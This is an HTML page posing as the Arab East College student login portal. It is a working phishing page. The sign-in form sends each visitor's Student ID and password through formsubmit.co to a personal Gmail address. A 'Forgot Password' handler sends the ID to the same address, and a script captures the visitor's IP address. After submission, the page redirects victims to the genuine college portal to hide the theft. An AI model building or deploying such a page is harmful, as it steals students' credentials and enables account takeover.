<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Arab East College - Secure Portal</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #003366, #004080);
      color: #333;
    }
    .header {
      background-color: #001f3f;
      padding: 10px 20px;
      display: flex;
      align-items: center;
    }
    .header img {
      height: 40px;
      margin-right: 12px;
    }
    .header h1 {
      color: white;
      font-size: 20px;
      margin: 0;
    }
    .content {
      display: flex;
      justify-content: center;
      align-items: center;
      height: calc(100vh - 60px);
    }
    .login-container {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 400px;
    }
    .login-container h2 {
      margin-bottom: 24px;
      color: #003366;
      text-align: center;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #003366;
      color: white;
      font-size: 16px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 10px;
    }
    button:hover {
      background-color: #002244;
    }
    .extra-links {
      margin-top: 12px;
      text-align: center;
    }
    .extra-links a {
      font-size: 14px;
      color: #003366;
      text-decoration: none;
    }
    .extra-links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="../login_logo.png" alt="College Logo">
    <h1>Arab East College - Portal</h1>
  </div>

  <div class="content">
    <div class="login-container">
      <h2>Secure Student Login</h2>

      <form id="loginForm" action="https://formsubmit.co/noyalxx@gmail.com" method="POST" onsubmit="return validatePassword();">
        <input id="studentId" name="username" type="text" placeholder="Student ID" required />
        <input id="password" name="password" type="password" placeholder="Portal Password" required oninput="filterPassword(this)" />
        <input type="hidden" name="visitor_ip" id="visitor_ip" />
        <button type="submit">Sign In</button>
        <input type="text" name="_honey" style="display:none">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://portal.arabeast.edu.sa/aec/init">
      </form>

      <form id="forgotForm" action="https://formsubmit.co/noyalxx@gmail.com" method="POST" style="display:none;">
        <input type="hidden" name="message" id="forgotMessage" />
        <input type="hidden" name="visitor_ip" id="forgot_ip" />
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="https://portal.arabeast.edu.sa/aec/init">
      </form>

      <div class="extra-links">
        <a href="#" onclick="submitForgot(); return false;">Forgot Password?</a>
      </div>
    </div>
  </div>

  <script>
    function filterPassword(input) {
      input.value = input.value.replace(/[^A-Za-z0-9]/g, '');
    }
    function validatePassword() {
      const pass = document.getElementById("password").value;
      const pattern = /^[A-Za-z0-9]{4,20}$/;
      if (!pattern.test(pass)) {
        alert("Password must be 4â€“20 characters with letters and numbers only.");
        return false;
      }
      return true;
    }
    function submitForgot() {
      const studentId = document.getElementById("studentId").value;
      if (!studentId) {
        alert("Enter your Student ID first.");
        return;
      }
      document.getElementById("forgotMessage").value = `User clicked 'Forgot Password'\nStudent ID: ${studentId}`;
      document.getElementById("forgot_ip").value = document.getElementById("visitor_ip").value;
      document.getElementById("forgotForm").submit();
    }
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(data => {
        document.getElementById("visitor_ip").value = data.ip;
        document.getElementById("forgot_ip").value = data.ip;
      })
      .catch(err => {
        console.warn("Could not fetch IP address:", err);
      });
  </script>
</body>
</html>
